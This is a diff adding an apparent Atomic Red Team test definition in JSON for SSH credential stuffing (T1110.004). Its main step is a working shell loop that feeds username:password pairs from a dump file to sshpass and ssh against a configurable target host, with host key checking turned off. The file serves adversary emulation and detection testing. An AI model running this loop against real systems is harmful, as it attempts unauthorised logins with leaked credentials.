@@ -1,0 +1,86 @@
+{
+  "id": "a790d50e-7ebf-48de-8daa-d9367e0911d4",
+  "name": "SSH Credential Stuffing From FreeBSD",
+  "description": "Using username,password combination from a password dump to login over SSH.\n",
+  "platforms": [
+    "linux"
+  ],
+  "steps": [
+    {
+      "id": "1b4955d7-71b6-4939-beb5-cbdc790ee836",
+      "type": "execute-command",
+      "data": {
+        "command": "cp $PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt /tmp/\nfor unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d\":\" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d\":\" -f1`@#{target_host};done\n",
+        "command_type": "sh"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "235d817b-f7fc-4243-97d7-1f073888526b",
+      "name": "Check dependency 1/1",
+      "description": "Requires SSHPASS\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if [ -x \"$(command -v sshpass)\" ]; then exit 0; else exit 1; fi;\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "d0d87d8a-9d66-4c0a-b144-8b2aaf24d426",
+      "name": "Resolve dependency 1/1",
+      "description": "Requires SSHPASS\n",
+      "type": "execute-command",
+      "data": {
+        "command": "pkg install -y sshpass\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "27c2fe57-9dd0-4899-b9f6-30a296980174",
+      "name": "Re-check dependency 1/1",
+      "description": "Requires SSHPASS\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if [ -x \"$(command -v sshpass)\" ]; then exit 0; else exit 1; fi;\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "235d817b-f7fc-4243-97d7-1f073888526b",
+      "p": "on-success",
+      "o": "1b4955d7-71b6-4939-beb5-cbdc790ee836"
+    },
+    {
+      "s": "235d817b-f7fc-4243-97d7-1f073888526b",
+      "p": "on-failure",
+      "o": "d0d87d8a-9d66-4c0a-b144-8b2aaf24d426"
+    },
+    {
+      "s": "d0d87d8a-9d66-4c0a-b144-8b2aaf24d426",
+      "p": "on-success",
+      "o": "27c2fe57-9dd0-4899-b9f6-30a296980174"
+    },
+    {
+      "s": "27c2fe57-9dd0-4899-b9f6-30a296980174",
+      "p": "on-failure",
+      "o": "1b4955d7-71b6-4939-beb5-cbdc790ee836"
+    }
+  ],
+  "tags": [
+    "T1110.004",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "target_host",
+      "type": "string",
+      "description": "IP Address / Hostname you want to target.",
+      "value": "localhost"
+    }
+  ]
+}
